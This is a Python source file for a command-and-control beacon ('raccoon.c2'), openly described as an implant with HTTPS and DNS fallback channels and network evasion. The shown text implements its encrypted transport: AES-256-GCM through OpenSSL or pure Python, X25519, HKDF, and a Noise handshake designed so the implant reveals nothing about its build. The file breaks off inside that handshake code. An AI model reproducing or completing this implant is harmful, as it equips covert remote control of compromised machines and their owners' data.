#!/usr/bin/env python3
"""
C2 beacon with HTTPS primary and DNS fallback channels.
AES-GCM encrypted payloads, Venom-style network evasion,
full command set with result reporting.

Zero external dependencies — stdlib only.
"""

import base64
import ctypes
import ctypes.util
import errno
import hashlib
import hmac
import http.client as http_client
import io
import json
import logging
import os
import platform
import random
import re
import shutil
import socket
import ssl
import stat
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import zipfile
import urllib.request
from pathlib import Path
from typing import Callable, Dict, Iterable, List, Optional, Tuple

logger = logging.getLogger("raccoon.c2")

_SYSFS_NET = "/sys/class/net"
_PROC_NET_ROUTE = "/proc/net/route"
_MONITOR_DRIVERS = ("88XXau", "rtl8812au", "8812au")

KEY_GENERATOR = ('python3 -c "import os,base64; '
                 'print(base64.b64encode(os.urandom(32)).decode())"')


def decode_key(value, field: str = "encryption_key") -> bytes:
    """The AES-256-GCM key in `value`, or a ValueError naming what is wrong.

    Shared by the beacon, the team server and the launchers, so the rule and
    the wording cannot drift between them. There is no derivation and no default: a key that both ends can compute
    from the callback URL is a key anyone who sees one message can compute.
    The messages name the field and the problem and never the value or any
    part of it, and are raised outside the except block so the decoder's
    own error cannot ride along in the chain.
    """
    text = value.strip() if isinstance(value, str) else ""
    problem = None
    key = b""
    if not text:
        problem = ("%s is required: there is no default key and none is "
                   "derived. Generate one with: %s" % (field, KEY_GENERATOR))
    else:
        try:
            key = base64.b64decode(text, validate=True)
        except ValueError:
            problem = ("%s is not valid base64. Generate a key with: %s"
                       % (field, KEY_GENERATOR))
        else:
            if len(key) != 32:
                problem = ("%s decodes to %d bytes; AES-256-GCM needs "
                           "exactly 32. Generate a key with: %s"
                           % (field, len(key), KEY_GENERATOR))
    if problem:
        raise ValueError(problem)
    return key


def beacon_key_problem(config) -> Optional[str]:
    """Why the implant config cannot supply the beacon's key, or None.

    Asked only where a Python beacon can be built: c2 and the fallback both
    enabled. A config that builds none needs no key, and demanding one would
    break it. Checked when the config is loaded so a bad key stops the
    process before the sniffer and cover are up, not after.
    """
    c2 = config.get("c2") if isinstance(config, dict) else None
    if not isinstance(c2, dict) or not c2.get("enabled"):
        return None
    fallback = c2.get("fallback")
    if not isinstance(fallback, dict) or not fallback.get("enabled"):
        return None
    try:
        decode_key(c2.get("encryption_key"), "c2.encryption_key")
    except ValueError as exc:
        return str(exc)
    return None


# ── Stdlib AES-256-GCM via OpenSSL ctypes ──

def _load_libcrypto():
    """Load OpenSSL libcrypto. Returns None if unavailable (macOS Library Validation)."""
    if platform.system() == "Darwin":
        brew_paths = [
            "/opt/homebrew/opt/openssl/lib/libcrypto.dylib",
            "/opt/homebrew/lib/libcrypto.dylib",
            "/usr/local/opt/openssl/lib/libcrypto.dylib",
            "/usr/local/lib/libcrypto.dylib",
            "/opt/local/lib/libcrypto.dylib",
        ]
        for p in brew_paths:
            if os.path.isfile(p):
                try:
                    return ctypes.CDLL(p)
                except OSError:
                    continue
    # `crypto` first, and it is not a typo: `find_library` adds the `lib`
    # prefix itself, so the POSIX name of this library is the bare stem and
    # `find_library("libcrypto")` looks for `liblibcrypto.so`. Without it
    # every candidate below is a Windows file stem, which is how a Debian
    # host with `libcrypto.so.3` in /usr/lib/<triplet>/ ended up on the
    # pure-Python cipher -- and therefore with a tunnel that refused to
    # start on this project's own target platform.
    for name in ("crypto", "libcrypto-3", "libcrypto-3-x64", "libcrypto-1_1",
                 "libcrypto-1_1-x64", "libcrypto"):
        path = ctypes.util.find_library(name)
        if path:
            try:
                return ctypes.CDLL(path)
            except OSError:
                continue
    ssl_path = getattr(ssl, "_ssl", None)
    if ssl_path and hasattr(ssl._ssl, "__file__"):
        d = os.path.dirname(ssl._ssl.__file__)
        for fn in os.listdir(d):
            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
                try:
                    return ctypes.CDLL(os.path.join(d, fn))
                except OSError:
                    continue
    ssl_dir = os.path.dirname(ssl.__file__)
    parent = os.path.dirname(ssl_dir)
    for search_dir in (ssl_dir, parent, os.path.join(parent, "DLLs"),
                       os.path.join(sys.prefix, "DLLs"),
                       os.path.join(sys.prefix, "lib")):
        if not os.path.isdir(search_dir):
            continue
        for fn in os.listdir(search_dir):
            if "libcrypto" in fn.lower() and fn.endswith((".dll", ".so", ".dylib")):
                try:
                    return ctypes.CDLL(os.path.join(search_dir, fn))
                except OSError:
                    continue
    return None


# ── Pure-Python AES-256-GCM (stdlib only, no ctypes) ──
# Used as fallback when libcrypto is unavailable (macOS Library Validation).

def _xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def _ghash_mul(x: bytes, h: bytes) -> bytes:
    """GF(2^128) multiplication for GHASH."""
    xi = int.from_bytes(x, "big")
    hi = int.from_bytes(h, "big")
    zi = 0
    R = 0xE1000000000000000000000000000000
    for i in range(128):
        if (xi >> (127 - i)) & 1:
            zi ^= hi
        carry = hi & 1
        hi >>= 1
        if carry:
            hi ^= R
    return zi.to_bytes(16, "big")


def _ghash(h: bytes, aad: bytes, ct: bytes) -> bytes:
    """GHASH function per NIST SP 800-38D."""
    def _pad16(data):
        r = len(data) % 16
        return data + b"\x00" * (16 - r) if r else data

    data = _pad16(aad) + _pad16(ct)
    data += (len(aad) * 8).to_bytes(8, "big") + (len(ct) * 8).to_bytes(8, "big")

    y = b"\x00" * 16
    for i in range(0, len(data), 16):
        block = data[i:i + 16]
        y = _ghash_mul(_xor(y, block), h)
    return y




# ── Pure-Python AES-256 single-block implementation ──

_AES_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]

_AES_RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]


def _aes256_expand_key(key: bytes):
    """AES-256 key expansion → list of 15 round keys (each 16 bytes)."""
    w = list(struct.unpack(">8I", key))
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = ((t << 8) | (t >> 24)) & 0xFFFFFFFF
            t = ((_AES_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_AES_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_AES_SBOX[(t >> 8) & 0xFF] << 8) |
                 _AES_SBOX[t & 0xFF])
            t ^= _AES_RCON[i // 8 - 1] << 24
        elif i % 8 == 4:
            t = ((_AES_SBOX[(t >> 24) & 0xFF] << 24) |
                 (_AES_SBOX[(t >> 16) & 0xFF] << 16) |
                 (_AES_SBOX[(t >> 8) & 0xFF] << 8) |
                 _AES_SBOX[t & 0xFF])
        w.append(w[i - 8] ^ t)
    rks = []
    for r in range(15):
        rks.append(struct.pack(">4I", *w[r * 4:(r + 1) * 4]))
    return rks


def _aes256_block(key: bytes, block: bytes) -> bytes:
    """Encrypt a single 16-byte block with AES-256 (column-major state)."""
    rks = _aes256_expand_key(key)

    def xtime(a):
        return ((a << 1) ^ 0x1b) & 0xFF if a & 0x80 else (a << 1) & 0xFF

    # State is column-major: state[row][col] = block[col*4 + row]
    s = bytearray(_xor(block, rks[0]))

    for rnd in range(1, 14):
        # SubBytes
        s = bytearray(_AES_SBOX[b] for b in s)
        # ShiftRows (state[row*4+col] in our flat layout where index = col*4+row)
        # row 1: shift left 1
        s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
        # row 2: shift left 2
        s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
        # row 3: shift left 3
        s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
        # MixColumns (operate on each column: indices col*4 .. col*4+3)
        t = bytearray(16)
        for col in range(4):
            i = col * 4
            a0, a1, a2, a3 = s[i], s[i+1], s[i+2], s[i+3]
            t[i]   = xtime(a0) ^ xtime(a1) ^ a1 ^ a2 ^ a3
            t[i+1] = a0 ^ xtime(a1) ^ xtime(a2) ^ a2 ^ a3
            t[i+2] = a0 ^ a1 ^ xtime(a2) ^ xtime(a3) ^ a3
            t[i+3] = xtime(a0) ^ a0 ^ a1 ^ a2 ^ xtime(a3)
        s = bytearray(_xor(bytes(t), rks[rnd]))

    # Final round (no MixColumns)
    s = bytearray(_AES_SBOX[b] for b in s)
    s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
    s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
    s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
    return bytes(_xor(bytes(s), rks[14]))


def _aes_ctr_encrypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """AES-256-CTR encryption (GCM uses CTR internally)."""
    out = bytearray()
    # GCM uses a 12-byte nonce + 4-byte big-endian counter starting at 2
    counter = 2
    for i in range(0, len(data), 16):
        cb = nonce + struct.pack(">I", counter)
        ks_block = _aes256_block(key, cb)
        chunk = data[i:i + 16]
        out.extend(_xor(chunk, ks_block[:len(chunk)]))
        counter += 1
    return bytes(out)


def _pure_aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
                          aad: bytes = b"") -> bytes:
    """Pure-Python AES-256-GCM encrypt. Returns ciphertext + 16-byte tag."""
    # H = AES(key, 0^128)
    h = _aes256_block(key, b"\x00" * 16)
    # Encrypt with CTR (counter starts at 2)
    ct = _aes_ctr_encrypt(key, nonce, plaintext)
    # GHASH
    ghash_val = _ghash(h, aad, ct)
    # Tag = GHASH XOR AES(key, nonce||0^31||1)
    j0 = nonce + b"\x00\x00\x00\x01"
    e_j0 = _aes256_block(key, j0)
    tag = _xor(ghash_val, e_j0)
    return ct + tag


def _pure_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
                          aad: bytes = b"") -> bytes:
    """Pure-Python AES-256-GCM decrypt. Raises ValueError on auth failure."""
    if len(ciphertext_with_tag) < 16:
        raise ValueError("Ciphertext too short")
    ct = ciphertext_with_tag[:-16]
    tag = ciphertext_with_tag[-16:]
    # H = AES(key, 0^128)
    h = _aes256_block(key, b"\x00" * 16)
    # Verify tag
    ghash_val = _ghash(h, aad, ct)
    j0 = nonce + b"\x00\x00\x00\x01"
    e_j0 = _aes256_block(key, j0)
    expected_tag = _xor(ghash_val, e_j0)
    if tag != expected_tag:
        raise ValueError("GCM authentication failed — wrong key or corrupted data")
    # Decrypt
    return _aes_ctr_encrypt(key, nonce, ct)


# ── Load libcrypto or fall back to pure-Python ──

_crypto = _load_libcrypto()
_USE_PURE_PYTHON_AES = _crypto is None

if not _USE_PURE_PYTHON_AES:
    _crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
    _crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_aes_256_gcm.restype = ctypes.c_void_p
    _crypto.EVP_EncryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_char_p, ctypes.c_char_p,
    ]
    _crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
    _crypto.EVP_DecryptInit_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        ctypes.c_char_p, ctypes.c_char_p,
    ]
    _crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
    _crypto.EVP_EncryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    _crypto.EVP_EncryptUpdate.restype = ctypes.c_int
    _crypto.EVP_DecryptUpdate.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
        ctypes.c_char_p, ctypes.c_int,
    ]
    _crypto.EVP_DecryptUpdate.restype = ctypes.c_int
    _crypto.EVP_EncryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
    ]
    _crypto.EVP_EncryptFinal_ex.restype = ctypes.c_int
    _crypto.EVP_DecryptFinal_ex.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int),
    ]
    _crypto.EVP_DecryptFinal_ex.restype = ctypes.c_int
    _crypto.EVP_CIPHER_CTX_ctrl.argtypes = [
        ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_char_p,
    ]
    _crypto.EVP_CIPHER_CTX_ctrl.restype = ctypes.c_int

EVP_CTRL_GCM_SET_IVLEN = 0x9
EVP_CTRL_GCM_GET_TAG = 0x10
EVP_CTRL_GCM_SET_TAG = 0x11
GCM_TAG_LEN = 16


def _aes_gcm_encrypt(key: bytes, nonce: bytes, plaintext: bytes,
                     aad: bytes = b"") -> bytes:
    """AES-256-GCM. Returns ciphertext with the 16-byte tag appended.

    `aad` is authenticated but not encrypted. It defaults to empty, which
    is what the beacon's own channels use; the Noise handshake below needs
    it, because Noise authenticates each handshake payload against the
    running handshake hash.
    """
    if _USE_PURE_PYTHON_AES:
        return _pure_aes_gcm_encrypt(key, nonce, plaintext, aad)
    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        raise RuntimeError("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_gcm()
        if _crypto.EVP_EncryptInit_ex(ctx, cipher, None, None, None) != 1:
            raise RuntimeError("EncryptInit_ex (cipher) failed")
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
            raise RuntimeError("Set IV length failed")
        if _crypto.EVP_EncryptInit_ex(ctx, None, None, key, nonce) != 1:
            raise RuntimeError("EncryptInit_ex (key/iv) failed")

        outlen = ctypes.c_int(0)
        # AAD goes in with a NULL output buffer, before any plaintext.
        if aad and _crypto.EVP_EncryptUpdate(
                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
            raise RuntimeError("EncryptUpdate (aad) failed")
        out = ctypes.create_string_buffer(len(plaintext) + 16)
        if _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), plaintext, len(plaintext)) != 1:
            raise RuntimeError("EncryptUpdate failed")
        ct_len = outlen.value

        final_buf = ctypes.create_string_buffer(16)
        final_len = ctypes.c_int(0)
        if _crypto.EVP_EncryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
            raise RuntimeError("EncryptFinal_ex failed")
        ct_len += final_len.value

        tag = ctypes.create_string_buffer(GCM_TAG_LEN)
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag) != 1:
            raise RuntimeError("Get tag failed")

        return out.raw[:ct_len] + tag.raw
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


def _aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext_with_tag: bytes,
                     aad: bytes = b"") -> bytes:
    """The inverse of `_aes_gcm_encrypt`. Raises ValueError if the tag,
    the key, the nonce or `aad` does not match what was encrypted.
    """
    if _USE_PURE_PYTHON_AES:
        return _pure_aes_gcm_decrypt(key, nonce, ciphertext_with_tag, aad)
    if len(ciphertext_with_tag) < GCM_TAG_LEN:
        raise ValueError("Ciphertext too short")
    ct = ciphertext_with_tag[:-GCM_TAG_LEN]
    tag = ciphertext_with_tag[-GCM_TAG_LEN:]

    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        raise RuntimeError("EVP_CIPHER_CTX_new failed")
    try:
        cipher = _crypto.EVP_aes_256_gcm()
        if _crypto.EVP_DecryptInit_ex(ctx, cipher, None, None, None) != 1:
            raise RuntimeError("DecryptInit_ex (cipher) failed")
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, len(nonce), None) != 1:
            raise RuntimeError("Set IV length failed")
        if _crypto.EVP_DecryptInit_ex(ctx, None, None, key, nonce) != 1:
            raise RuntimeError("DecryptInit_ex (key/iv) failed")

        outlen = ctypes.c_int(0)
        if aad and _crypto.EVP_DecryptUpdate(
                ctx, None, ctypes.byref(outlen), aad, len(aad)) != 1:
            raise RuntimeError("DecryptUpdate (aad) failed")
        out = ctypes.create_string_buffer(len(ct) + 16)
        if _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), ct, len(ct)) != 1:
            raise RuntimeError("DecryptUpdate failed")
        pt_len = outlen.value

        tag_buf = ctypes.create_string_buffer(tag)
        if _crypto.EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_LEN, tag_buf) != 1:
            raise RuntimeError("Set tag failed")

        final_buf = ctypes.create_string_buffer(16)
        final_len = ctypes.c_int(0)
        if _crypto.EVP_DecryptFinal_ex(ctx, final_buf, ctypes.byref(final_len)) != 1:
            raise ValueError("GCM authentication failed — wrong key or corrupted data")
        pt_len += final_len.value

        return out.raw[:pt_len]
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


# ── X25519 key agreement via OpenSSL ctypes ──

_X25519_KEY_LEN = 32
# obj_mac.h. X25519 has no EVP_PKEY_CTX_new_id of its own: the raw-key
# constructors take the NID directly.
_NID_X25519 = 1034
# RFC 7748 §4.1: u = 9. A public key is the private scalar applied to it,
# so the keypair needs no separate OpenSSL code path.
_X25519_BASEPOINT = b"\x09" + b"\x00" * 31

# The raw-key API arrived in OpenSSL 1.1.1. An older libcrypto loads and
# serves AES-256-GCM perfectly well, so this flag is its own measurement
# and not a copy of _USE_PURE_PYTHON_AES -- and it is read at call time,
# so a test can force either backend.
_USE_PURE_PYTHON_X25519 = (
    _crypto is None
    or not hasattr(_crypto, "EVP_PKEY_new_raw_private_key")
    or not hasattr(_crypto, "EVP_PKEY_derive"))

if not _USE_PURE_PYTHON_X25519:
    _crypto.EVP_PKEY_new_raw_private_key.argtypes = [
        ctypes.c_int, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_size_t,
    ]
    _crypto.EVP_PKEY_new_raw_private_key.restype = ctypes.c_void_p
    _crypto.EVP_PKEY_new_raw_public_key.argtypes = [
        ctypes.c_int, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_size_t,
    ]
    _crypto.EVP_PKEY_new_raw_public_key.restype = ctypes.c_void_p
    _crypto.EVP_PKEY_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_PKEY_CTX_new.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    _crypto.EVP_PKEY_CTX_new.restype = ctypes.c_void_p
    _crypto.EVP_PKEY_CTX_free.argtypes = [ctypes.c_void_p]
    _crypto.EVP_PKEY_derive_init.argtypes = [ctypes.c_void_p]
    _crypto.EVP_PKEY_derive_init.restype = ctypes.c_int
    _crypto.EVP_PKEY_derive_set_peer.argtypes = [
        ctypes.c_void_p, ctypes.c_void_p,
    ]
    _crypto.EVP_PKEY_derive_set_peer.restype = ctypes.c_int
    _crypto.EVP_PKEY_derive.argtypes = [
        ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(ctypes.c_size_t),
    ]
    _crypto.EVP_PKEY_derive.restype = ctypes.c_int


# ── Pure-Python X25519 (stdlib only, no ctypes) ──
# Used as fallback when libcrypto is unavailable or predates the raw-key
# API. Not constant-time -- the conditional swap below is a Python `if`,
# as the pure AES above is also not constant-time. Both are a fallback
# for a host that denies us libcrypto, not a claim of side-channel
# resistance; the key is ephemeral and used for one handshake.

_X25519_P = 2 ** 255 - 19
_X25519_A24 = 121665


def _x25519_clamp(scalar: bytes) -> int:
    """The scalar as RFC 7748 §5 decodes it: low three bits and the top
    bit cleared, bit 254 set. Clearing the low bits confines the result to
    the prime-order subgroup; setting bit 254 fixes the ladder's length.
    """
    k = bytearray(scalar)
    k[0] &= 248
    k[31] &= 127
    k[31] |= 64
    return int.from_bytes(k, "little")


def _pure_x25519(private: bytes, peer_public: bytes) -> bytes:
    """Pure-Python X25519. The RFC 7748 §5 Montgomery ladder verbatim.

    255 iterations from bit 254 down, each a conditional swap followed by
    one differential add-and-double, then a single inversion by Fermat's
    little theorem. The top bit of the u-coordinate is masked off before
    use, which RFC 7748 §5 requires of every receiver.
    """
    p = _X25519_P
    k = _x25519_clamp(private)
    x1 = int.from_bytes(peer_public, "little") & ((1 << 255) - 1)
    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
    for t in range(254, -1, -1):
        k_t = (k >> t) & 1
        swap ^= k_t
        if swap:
            x2, x3 = x3, x2
            z2, z3 = z3, z2
        swap = k_t
        a = (x2 + z2) % p
        aa = (a * a) % p
        b = (x2 - z2) % p
        bb = (b * b) % p
        e = (aa - bb) % p
        c = (x3 + z3) % p
        d = (x3 - z3) % p
        da = (d * a) % p
        cb = (c * b) % p
        x3 = pow(da + cb, 2, p)
        z3 = (x1 * pow(da - cb, 2, p)) % p
        x2 = (aa * bb) % p
        z2 = (e * (aa + _X25519_A24 * e)) % p
    if swap:
        x2, x3 = x3, x2
        z2, z3 = z3, z2
    shared = (x2 * pow(z2, p - 2, p)) % p
    return shared.to_bytes(_X25519_KEY_LEN, "little")


def _x25519_keypair() -> Tuple[bytes, bytes]:
    """A fresh (private, public) X25519 keypair, 32 bytes each.

    The private key is 32 random bytes as RFC 7748 §6.1 specifies;
    clamping happens inside the scalar multiplication, so there is nothing
    to normalise here. The public key is derived through whichever backend
    is active, which keeps a keypair from one backend usable by the other.
    """
    private = os.urandom(_X25519_KEY_LEN)
    return private, _x25519(private, _X25519_BASEPOINT)


def _x25519(private: bytes, peer_public: bytes) -> bytes:
    """The 32-byte X25519 shared secret for `private` and `peer_public`.

    Both arguments must be exactly 32 bytes: a short or long key is a
    framing bug upstream, and the ladder would otherwise reinterpret it
    and return a secret the far end cannot reach. An all-zero result means
    the peer sent a low-order point, which yields a shared secret an
    attacker already knows; OpenSSL refuses to derive one and so does the
    pure path, so the two backends agree on the rejection too.
    """
    if len(private) != _X25519_KEY_LEN:
        raise ValueError("X25519 private key is %d bytes; it must be "
                         "exactly %d" % (len(private), _X25519_KEY_LEN))
    if len(peer_public) != _X25519_KEY_LEN:
        raise ValueError("X25519 peer public key is %d bytes; it must be "
                         "exactly %d" % (len(peer_public), _X25519_KEY_LEN))

    if _USE_PURE_PYTHON_X25519:
        shared = _pure_x25519(private, peer_public)
        if shared == b"\x00" * _X25519_KEY_LEN:
            raise ValueError("X25519 derivation failed — peer public key "
                             "is a low-order point")
        return shared

    pkey = _crypto.EVP_PKEY_new_raw_private_key(
        _NID_X25519, None, private, len(private))
    if not pkey:
        raise RuntimeError("EVP_PKEY_new_raw_private_key failed")
    peer = None
    ctx = None
    try:
        peer = _crypto.EVP_PKEY_new_raw_public_key(
            _NID_X25519, None, peer_public, len(peer_public))
        if not peer:
            raise RuntimeError("EVP_PKEY_new_raw_public_key failed")
        ctx = _crypto.EVP_PKEY_CTX_new(pkey, None)
        if not ctx:
            raise RuntimeError("EVP_PKEY_CTX_new failed")
        if _crypto.EVP_PKEY_derive_init(ctx) != 1:
            raise RuntimeError("EVP_PKEY_derive_init failed")
        if _crypto.EVP_PKEY_derive_set_peer(ctx, peer) != 1:
            raise RuntimeError("EVP_PKEY_derive_set_peer failed")
        outlen = ctypes.c_size_t(_X25519_KEY_LEN)
        out = ctypes.create_string_buffer(_X25519_KEY_LEN)
        if _crypto.EVP_PKEY_derive(ctx, out, ctypes.byref(outlen)) != 1:
            raise ValueError("X25519 derivation failed — peer public key "
                             "is a low-order point")
        return out.raw[:outlen.value]
    finally:
        if ctx:
            _crypto.EVP_PKEY_CTX_free(ctx)
        if peer:
            _crypto.EVP_PKEY_free(peer)
        _crypto.EVP_PKEY_free(pkey)


# ── HKDF, Noise's flavour ──

def _hkdf(chaining_key: bytes, input_material: bytes,
          num_outputs: int) -> Tuple[bytes, ...]:
    """Noise §4.3 HKDF: `num_outputs` 32-byte keys from a chaining key.

    This is RFC 5869 with the arguments Noise names and no `info`: the
    chaining key is the salt, so `temp_key = HMAC(chaining_key, ikm)` is
    RFC 5869's extract step, and each output is the expand step's next
    block, `HMAC(temp_key, previous || i)`. Signature follows Noise rather
    than RFC 5869 because the handshake state is what calls it -- with two
    outputs after a DH, three when it also needs a handshake hash.
    """
    if num_outputs not in (2, 3):
        raise ValueError("HKDF produces two or three outputs, not %r"
                         % (num_outputs,))
    temp_key = hmac.new(chaining_key, input_material, hashlib.sha256).digest()
    outputs = []
    previous = b""
    for i in range(1, num_outputs + 1):
        previous = hmac.new(temp_key, previous + bytes([i]),
                            hashlib.sha256).digest()
        outputs.append(previous)
    return tuple(outputs)


# ── Noise_NKpsk0_25519_AESGCM_SHA256 ──
#
# The Noise Protocol Framework, revision 34, for one pattern and one
# cipher suite. `NK` means the responder's static public key is known to
# the initiator in advance, as a pre-message, and the initiator has no
# static key of its own -- which is what an implant wants: nothing in the
# artifact identifies the build to a server it has not yet reached, and
# nothing in the artifact lets a second implant impersonate the server.
# `psk0` mixes a 32-byte pre-shared key in as the first token of the
# first message, so an unauthenticated peer cannot produce a message the
# responder will answer, and the responder has nothing to say to one.
#
#   NKpsk0:
#     <- s
#     ...
#     -> psk, e, es
#     <- e, ee
#
# Transport messages are capped at 65535 bytes including the 16-byte tag,
# because the framing above this carries a `>H` length prefix.

_NOISE_KEY_LEN = 32
# Noise §5.1: the counter must never reach 2**64-1.
_NOISE_MAX_NONCE = 2 ** 64 - 1

_NOISE_START = "start"
_NOISE_SENT_MESSAGE_ONE = "sent message 1"
_NOISE_READ_MESSAGE_ONE = "read message 1"
_NOISE_TRANSPORT = "transport"
_NOISE_FAILED = "failed"


def _noise_32_bytes(value, what: str) -> bytes:
    """`value` as 32 bytes, or a ValueError naming `what` and the length.

    Never names the value: every caller passes key material. Noise fixes
    every key in this suite at 32 bytes, and HKDF would happily accept a
    short one and produce a handshake that completed -- which is the worst
    outcome available for a secret, so the length is checked where it
    enters rather than where it fails.
    """
    if not isinstance(value, (bytes, bytearray)):
        raise ValueError("%s must be 32 bytes, not %s"
                         % (what, type(value).__name__))
    if len(value) != _NOISE_KEY_LEN:
        raise ValueError("%s is %d bytes; it must be exactly %d"
                         % (what, len(value), _NOISE_KEY_LEN))
    return bytes(value)


class _CipherState:
    """Noise §5.1 CipherState: one key and one 64-bit message counter.

    AESGCM's nonce is 32 bits of zeroes followed by the counter
    big-endian (Noise §12.3), so the counter is the whole of the replay
    protection: there is no window and no reordering, which is what a
    stream on top of TCP wants. A failed decryption does not advance it,
    so a tampered or duplicated frame cannot desynchronise the honest
    ones -- though Noise §5.1 requires the session be abandoned anyway.
    """

    def __init__(self, key: bytes):
        self._key = key
        self._nonce = 0

    def _current_nonce(self) -> bytes:
        if self._nonce >= _NOISE_MAX_NONCE:
            raise ValueError(
                "Noise cipher state is exhausted: the nonce reached "
                "2**64-1, and reusing one under the same key would void "
                "the cipher")
        return b"\x00" * 4 + struct.pack(">Q", self._nonce)

    def encrypt_with_ad(self, ad: bytes, plaintext: bytes) -> bytes:
        out = _aes_gcm_encrypt(self._key, self._current_nonce(), plaintext,
                               ad)
        self._nonce += 1
        return out

    def decrypt_with_ad(self, ad: bytes, ciphertext: bytes) -> bytes:
        out = _aes_gcm_decrypt(self._key, self._current_nonce(), ciphertext,
                               ad)
        self._nonce += 1
        return out


class _SymmetricState:
    """Noise §5.2 SymmetricState: the chaining key, the handshake hash,
    and the cipher state the two of them key.
    """

    def __init__(self, protocol_name: bytes):
        # InitializeSymmetric pads a protocol name shorter than the hash
        # with zeroes and hashes a longer one. This suite's name is
        # exactly 32 bytes -- SHA-256's output length -- so `h` is the
        # name verbatim and neither case can arise here.
        self._h = protocol_name
        self._ck = protocol_name
        self._cipher = None

